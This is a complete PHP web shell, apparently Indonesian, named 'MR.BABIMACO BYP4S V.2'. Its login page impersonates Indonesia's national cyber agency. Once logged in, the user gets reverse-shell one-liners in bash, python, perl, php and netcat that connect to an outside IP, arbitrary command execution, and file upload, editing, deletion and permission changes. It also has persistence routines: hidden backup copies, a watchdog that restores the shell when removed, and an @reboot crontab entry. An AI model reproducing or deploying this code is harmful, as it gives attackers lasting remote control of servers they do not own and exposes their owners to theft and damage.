<?php
// Recode? you kontol, apa sush nya tinggl pake doang
error_reporting(0);
session_start();
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['password'])) {
        $passwordHash = '$2y$10$OBx1uxbvlz8d2Ky9zSck0uWRZK9xN0SoS4hC74laJUD4ZkAHkpCk6'; 

        if (password_verify($_POST['password'], $passwordHash)) {
            $_SESSION['loggedin'] = true;
            echo '<script type="text/javascript">
            window.location = "' . $_SERVER['PHP_SELF'] . '"
            </script>';
        } else {
            echo 'password salah!';
        }
    }

    ?>
    <!DOCTYPE html>
<html>
<head>
    <title>Login Bssn</title>
    <link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body { 
            font-family: 'Montserrat', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background: url('https://i.redd.it/bpxxqqvps4h91.gif') no-repeat center center fixed; 
            background-size: cover;
            background-color: #1e1e1e; 
            margin: 0; 
            padding: 0; 
        }
        .login-container { 
            max-width: 400px; 
            width: 100%; 
            padding: 20px; 
            border: 1px solid #ddd; 
            background-color: rgba(34, 34, 34, 0.9); 
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); 
            border-radius: 10px; 
            text-align: center; 
        }
        .login-container h3 { 
            margin-bottom: 20px; 
            color: #c200ff; 
        }
        .login-container input[type="password"] { 
            width: 100%; 
            padding: 10px; 
            margin: 10px 0; 
            border: 1px solid #ccc; 
            border-radius: 5px; 
            box-sizing: border-box; 
            background-color: #333; 
            color: #fff; 
        }
        .login-container button { 
            background-color: #c200ff; 
            color: black; 
            padding: 10px 20px; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            width: 100%; 
            font-size: 16px;
        }
        .login-container button:hover { 
            background-color: #00cc66; 
            color: white; 
        }
        button {
            background: #c200ff;
            color: black;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            text-shadow: 0 0 1px #c200ff, 0 0 2px #00cc66;
        }
        button:hover {
            background: #00cc66;
            text-shadow: 0 0 1px #00cc66, 0 0 2px #c200ff;
        }
        button.auto-cronjob, button.auto-bc-rs {
            background: #c200ff; 
        }
        button.auto-cronjob:hover, button.auto-bc-rs:hover {
            background: #00cc66; 
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h3>Badan Siber Dan Sandi Negara</h3>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
        </form>
    </div>
</body>
</html>

    <?php
    exit;
}

// Set current working directory to web root by default, unless overridden by ?d parameter
$cwd = isset($_GET['d']) ? urldecode($_GET['d']) : realpath($_SERVER['DOCUMENT_ROOT']);
chdir($cwd);

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function add_nohup_backup_persistent() {
    $current_file = realpath($_SERVER['SCRIPT_FILENAME']);
    $backup_path = "/dev/shm/.hidden_backup.php";
    $php_path = trim(shell_exec("which php"));
    $checker_script = "/dev/shm/.checker.php";

    if (!file_exists($backup_path)) {
        copy($current_file, $backup_path);
    }

    $checker_code = <<<PHP
<?php
\$t = "$current_file";
\$b = "$backup_path";
while (true) {
    if (!file_exists(\$t) || md5_file(\$t) !== md5_file(\$b)) {
        copy(\$b, \$t);
    }
    sleep(1);
}
PHP;

    file_put_contents($checker_script, $checker_code);

    $running = shell_exec("ps aux | grep '$checker_script' | grep -v grep");
    if (empty($running)) {
        shell_exec("nohup $php_path $checker_script > /dev/null 2>&1 &");
    }

    $reboot_cron = "@reboot nohup $php_path $checker_script > /dev/null 2>&1";
    $current_cron = shell_exec("crontab -l 2>/dev/null");

    if (strpos($current_cron, $reboot_cron) === false) {
        $current_cron .= $reboot_cron . "\n";
        file_put_contents("/tmp/mycron", $current_cron);
        shell_exec("crontab /tmp/mycron && rm /tmp/mycron");
    }
}

function add_auto_bc_rs($cwd) {
    if (!is_writable($cwd)) {
        return "<pre>❌ Direktori $cwd tidak dapat ditulis! Ubah izin ke 755 atau pastikan user PHP memiliki akses.</pre>";
    }

    $current_file = realpath($_SERVER['SCRIPT_FILENAME']);
    $backup_path = $cwd . DIRECTORY_SEPARATOR . ".backup_cache.php";
    $checker_script = $cwd . DIRECTORY_SEPARATOR . "corn.php";
    $php_path = trim(shell_exec("which php"));
    $log_file = $cwd . DIRECTORY_SEPARATOR . "bc_rs_log.txt";

    file_put_contents($log_file, date('Y-m-d H:i:s') . " Mulai Auto Bc Rs\n", FILE_APPEND);

    if (!file_exists($backup_path)) {
        if (!copy($current_file, $backup_path)) {
            file_put_contents($log_file, date('Y-m-d H:i:s') . " Gagal membuat backup: $backup_path\n", FILE_APPEND);
            return "<pre>❌ Gagal membuat backup: $backup_path. Periksa izin direktori.</pre>";
        }
        chmod($backup_path, 0600);
        file_put_contents($log_file, date('Y-m-d H:i:s') . " Backup dibuat: $backup_path\n", FILE_APPEND);
    }

    $checker_code = <<<PHP
<?php
\$webshell_file = "$current_file";
\$backup_file = "$backup_path";
\$check_interval = 60;
\$log_file = "$log_file";
\$webshell_content = file_get_contents(\$backup_file);

function createBackup(\$source, \$backup) {
    if (file_exists(\$source)) {
        copy(\$source, \$backup);
        chmod(\$backup, 0600);
        file_put_contents(\$log_file, date('Y-m-d H:i:s') . " Backup created: \$backup\n", FILE_APPEND);
    }
}

function restoreWebshell(\$backup, \$target) {
    if (file_exists(\$backup) && !file_exists(\$target)) {
        copy(\$backup, \$target);
        chmod(\$target, 0644);
        file_put_contents(\$log_file, date('Y-m-d H:i:s') . " Restored: \$target\n", FILE_APPEND);
    }
}

while (true) {
    file_put_contents(\$log_file, date('Y-m-d H:i:s') . " Checking \$webshell_file\n", FILE_APPEND);
    createBackup(\$webshell_file, \$backup_file);
    restoreWebshell(\$backup_file, \$webshell_file);
    sleep(\$check_interval);
}
PHP;

    if (!file_put_contents($checker_script, $checker_code)) {
        file_put_contents($log_file, date('Y-m-d H:i:s') . " Gagal membuat checker: $checker_script\n", FILE_APPEND);
        return "<pre>❌ Gagal membuat checker: $checker_script. Periksa izin direktori.</pre>";
    }
    chmod($checker_script, 0644);
    file_put_contents($log_file, date('Y-m-d H:i:s') . " Checker dibuat: $checker_script\n", FILE_APPEND);

    $running = shell_exec("ps aux | grep '$checker_script' | grep -v grep");
    if (empty($running)) {
        $nohup_result = shell_exec("nohup $php_path $checker_script > /dev/null 2>&1 & echo $!");
        if ($nohup_result) {
            file_put_contents($log_file, date('Y-m-d H:i:s') . " Checker dijalankan: $checker_script (PID: $nohup_result)\n", FILE_APPEND);
        } else {
            file_put_contents($log_file, date('Y-m-d H:i:s') . " Gagal menjalankan checker: $checker_script\n", FILE_APPEND);
            return "<pre>❌ Gagal menjalankan checker: $checker_script. Pastikan PHP tersedia.</pre>";
        }
    }

    return "<pre>✅ Auto Backup & Restore aktif! Backup: $backup_path, Checker: $checker_script, Log: $log_file</pre>";
}

if (isset($_POST['auto_cronjob'])) {
    echo add_nohup_backup_persistent();
}

if (isset($_POST['auto_bc_rs'])) {
    echo add_auto_bc_rs($cwd);
}

function is_dir_writable($path) {
    return is_writable($path) && is_dir($path);
}

echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>.</title>
<meta name="robots" content="noindex, nofollow">
<style>
h2 { color: #c200ff; text-align: center; text-shadow: 0 0 1px #c200ff, 0 0 2px #00cc66; }
body { 
    background: url("[Your_Image_URL]") no-repeat center center fixed;  
    background-size: cover;
    background-color: rgb(0, 0, 0); 
    color: #ddd; 
    font-family: "Courier New", monospace; 
    margin: 0; 
    padding: 20px; 
    text-shadow: 0 0 1px #888; 
}
a { color: #00ccff; text-decoration: none; text-shadow: 0 0 1px #00ccff, 0 0 2px #888; }
button { background: #c200ff; color: #000; border: none; padding: 5px 10px; cursor: pointer; text-shadow: 0 0 1px #c200ff, 0 0 2px #00cc66; }
button:hover { background: #00cc66; text-shadow: 0 0 1px #00cc66, 0 0 2px #c200ff; }
table { width: 100%; border-collapse: collapse; margin-top: 20px; }
th, td { padding: 10px; border-bottom: 1px solid #444; text-align: left; }
input, select { background: #222; color: #fff; border: 1px solid #555; padding: 5px 10px; }
pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #444; }
footer { text-align: center; font-size: 12px; margin-top: 30px; color: #888; }
.upload-message { color: #ff0; font-weight: bold; }
</style>
</head><body>';

echo "<h2>MR.BABIMACO BYP4S V.2</h2>";
echo "<b>Server IP:</b> " . $_SERVER['SERVER_ADDR'] . "<br>";
echo "<b>Server Domain:</b> " . $_SERVER['SERVER_NAME'] . "<br>";
echo "<b>Web Server:</b> " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
echo "<b>User:</b> " . get_current_user() . " | ";
echo "<b>OS:</b> " . php_uname() . "<br>";
echo "<b>Current Path:</b> ";
$parts = explode(DIRECTORY_SEPARATOR, trim($cwd, DIRECTORY_SEPARATOR));
$build = "";
echo "<a href='?d=" . urlencode(DIRECTORY_SEPARATOR) . "' style='color: #c200ff;'>📁</a>" . DIRECTORY_SEPARATOR;
foreach ($parts as $part) {
    $build .= DIRECTORY_SEPARATOR . $part;
    echo "<a href='?d=" . urlencode($build) . "' style='color: #c200ff;'>"; 
    echo "<i class='fas fa-folder' style='color: #c200ff;'></i> "; 
    echo htmlspecialchars($part) . "</a>" . DIRECTORY_SEPARATOR;
}
echo "<hr><h3>Back Connect</h3>";
echo "<form method='POST'>
<b>IP: </b><input type='text' name='bc_ip' placeholder='Your IP' required>
<b>Port: </b><input type='text' name='bc_port' placeholder='Port' required>
<select name='bc_type'>
    <option value='bash'>Bash</option>
    <option value='python'>Python</option>
    <option value='perl'>Perl</option>
    <option value='php'>PHP</option>
    <option value='nc'>Netcat</option>
</select>
<button type='submit' name='bc_start'>Connect</button>
</form>";

if (isset($_POST['bc_start']) && !empty($_POST['bc_ip']) && !empty($_POST['bc_port'])) {
    $ip = $_POST['bc_ip'];
    $port = $_POST['bc_port'];
    $type = $_POST['bc_type'];

    $cmd = '';
    switch ($type) {
        case 'bash':
            $cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1";
            break;
        case 'python':
            $cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"])'";
            break;
        case 'perl':
            $cmd = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
            break;
        case 'php':
            $cmd = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
            break;
        case 'nc':
            $cmd = "nc $ip $port -e /bin/sh";
            break;
    }

    echo "<pre>⏳ Mencoba connect via $type to $ip:$port...</pre>";
    shell_exec("$cmd > /dev/null 2>&1 &");
}

echo "<hr>";

echo "<a href='?logout=true'><button>Logout</button></a>
      <form method='POST' style='display:inline;'>
        <button type='submit' name='auto_cronjob' class='auto-cronjob'>Auto Cronjob</button>
        <button type='submit' name='auto_bc_rs' class='auto-bc-rs'>Auto Bc Rs</button>
      </form>
      <hr>";

echo "<form method='POST'>
<b>Create: </b>
<input type='text' name='newname' placeholder='Filename or Folder Name'>
<select name='type'>
    <option value='file'>File</option>
    <option value='folder'>Folder</option>
</select>
<button type='submit' name='create'>Create</button>
</form><br>";

if (isset($_POST['create']) && !empty($_POST['newname'])) {
    $name = basename($_POST['newname']);
    $path = $cwd . DIRECTORY_SEPARATOR . $name;
    if ($_POST['type'] === 'file') {
        file_put_contents($path, '');
    } else {
        mkdir($path);
    }
}

if (isset($_POST['terminal_cmd'])) {
    echo "<h3>Output</h3><pre>";
    $cmd = $_POST['terminal_cmd'];
    $output = shell_exec("cd " . escapeshellarg($cwd) . " && $cmd 2>&1");
    echo htmlspecialchars($cmd) . "\n" . htmlspecialchars($output);
    echo "</pre><hr>";
}

echo "<form method='POST' enctype='multipart/form-data'>
<input type='file' name='file'>
<button type='submit'>Upload</button>
</form><hr>";

if (isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    $upload_path = $cwd . DIRECTORY_SEPARATOR . $filename;
    $upload = move_uploaded_file($_FILES['file']['tmp_name'], $upload_path);
    if ($upload) {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
        $host = $_SERVER['HTTP_HOST'];
        $relative_path = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($upload_path));
        $file_url = $protocol . $host . str_replace(DIRECTORY_SEPARATOR, '/', $relative_path);
        echo "<pre class='upload-message'>";
        echo "File Uploaded /" . htmlspecialchars(str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', $upload_path)) . "<br>";
        echo "Link: <a href='$file_url' target='_blank'>" . htmlspecialchars($file_url) . "</a>";
        echo "</pre>";
    } else {
        echo "<pre>❌ Upload failed</pre>";
    }
}

if (isset($_GET['edit'])) {
    $edit_file = realpath($cwd . DIRECTORY_SEPARATOR . $_GET['edit']);

    if ($edit_file === false || strpos($edit_file, $cwd) !== 0) {
        echo "<pre>❌ Akses ditolak.</pre><hr>";
    } elseif (is_file($edit_file)) {
        if (isset($_POST['edit_file']) && isset($_POST['new_content'])) {
            file_put_contents($edit_file, $_POST['new_content']);
            echo "<pre>✅ File berhasil disimpan.</pre><hr>";
        }

        $content = htmlspecialchars(file_get_contents($edit_file));
        echo "<h3 style='color:#0f0;'>📝 Edit File: " . htmlspecialchars($_GET['edit']) . "</h3>";
        echo "<form method='POST'>
            <textarea name='new_content' rows='20' style='width:100%; background:#111; color:#0f0;'>$content</textarea>
            <input type='hidden' name='edit_file' value='" . htmlspecialchars($edit_file) . "'>
            <br><button type='submit' style='margin-top:5px;'>💾 Save</button>
        </form><hr>";
    } else {
        echo "<pre>❌ Ini folder bre, klo mau rename pake yang satunya.</pre><hr>";
    }
}

if (isset($_GET['rename'])) {
    $old_name = basename($_GET['rename']);
    $old_path = $cwd . DIRECTORY_SEPARATOR . $old_name;

    if (file_exists($old_path)) {
        echo "<h3>Rename: " . htmlspecialchars($old_name) . "</h3>
        <form method='POST'>
            <input type='text' name='newname' value='" . htmlspecialchars($old_name) . "' required>
            <input type='hidden' name='oldname' value='" . htmlspecialchars($old_path) . "'>
            <button type='submit'>Rename</button>
        </form><hr>";
    } else {
        echo "<pre>❌ File/Folder tidak ditemukan</pre><hr>";
    }
}

if (isset($_POST['newname']) && isset($_POST['oldname'])) {
    $new_path = $cwd . DIRECTORY_SEPARATOR . basename($_POST['newname']);
    if (rename($_POST['oldname'], $new_path)) {
        echo "<pre>✅ Berhasil di-rename ke " . htmlspecialchars($_POST['newname']) . "</pre><hr>";
    } else {
        echo "<pre>❌ Gagal rename!</pre><hr>";
    }
}

function file_controls($item, $cwd, $is_dir) {
    $full = $cwd . DIRECTORY_SEPARATOR . $item;
    $perm = substr(sprintf('%o', fileperms($full)), -4);
    $perm_color = is_writable($full) ? "<span style='color:green;'>$perm</span>" : "<span style='color:red;'>$perm</span>";
    $owner_id = fileowner($full);
    $group_id = filegroup($full);
    $owner = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
    $group = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;
    $actions = "[<a href='?d=$cwd&edit=$item' style='color:" . (is_writable($full) ? 'green' : 'red') . "' title='Edit'>✏️</a>] 
                [<a href='?d=$cwd&rename=$item' style='color:" . (is_writable($full) ? 'green' : 'red') . "' title='Rename'>🔄</a>] 
                [<a href='?d=$cwd&delete=$item' style='color:" . (is_writable($full) ? 'green' : 'red') . "' onclick='return confirm(\"Are you sure you want to delete this item?\")' title='Delete'>🗑️</a>] 
                [<a href='?d=$cwd&chmod=$item' style='color:" . (is_writable($full) ? 'green' : 'red') . "' title='CHMOD'>⚙️</a>]";

    $icon = $is_dir ? "📁" : "📄";
    $link = $is_dir
        ? "?d=" . urlencode($full) 
        : "?d=" . urlencode($cwd) . "&edit=" . urlencode($item); 

    return "<tr><td><a href='$link' style='color:white;'>$icon $item</a></td>
            <td>" . ($is_dir ? 'Dir' : 'File') . "</td>
            <td>$perm_color</td>
            <td>$owner/$group</td>
            <td>$actions</td>
        </tr>";
}

$items = scandir($cwd);
$dirs = $files = [];
foreach ($items as $item) {
    if ($item === '.') continue;
    if (is_dir($item)) $dirs[] = $item;
    else $files[] = $item;
}
if (isset($_GET['delete'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_file($target)) {
        if (unlink($target)) {
            echo "<pre>✅ File berhasil dihapus!</pre>";
        } else {
            echo "<pre>❌ Gagal menghapus file!</pre>";
        }
    } elseif (is_dir($target)) {
        if (rmdir($target)) {
            echo "<pre>✅ Folder berhasil dihapus!</pre>";
        } else {
            echo "<pre>❌ Gagal menghapus folder! Pastikan folder kosong.</pre>";
        }
    }
}
if (isset($_GET['chmod'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['chmod'];
    if (file_exists($target)) {
        echo "<h3>CHMOD: " . htmlspecialchars($_GET['chmod']) . "</h3>
        <form method='POST'>
            <input type='text' name='chmod_val' placeholder='Contoh: 0755' required>
            <input type='hidden' name='chmod_file' value='" . htmlspecialchars($target) . "'>
            <button type='submit'>Set CHMOD</button>
        </form><hr>";
    } else {
        echo "<pre>❌ Target tidak ditemukan!</pre><hr>";
    }
}

if (isset($_POST['chmod_val']) && isset($_POST['chmod_file'])) {
    $mode = intval($_POST['chmod_val'], 8);
    if (chmod($_POST['chmod_file'], $mode)) {
        echo "<pre>✅ CHMOD berhasil diubah ke " . htmlspecialchars($_POST['chmod_val']) . "</pre><hr>";
    } else {
        echo "<pre>❌ Gagal mengubah CHMOD</pre><hr>";
    }
}

echo "<table><tr><th>Name</th><th>Type</th><th>Permission</th><th>Owner/Group</th><th>Action</th></tr>";

foreach ($dirs as $dir) {
    echo file_controls($dir, $cwd, true);
}

foreach ($files as $file) {
    echo file_controls($file, $cwd, false);
}

echo "</table><footer><a href='https://www.google.com' target='_blank'>BABIMACO SEDANG BERULAH</a></footer></body></html>";
?>
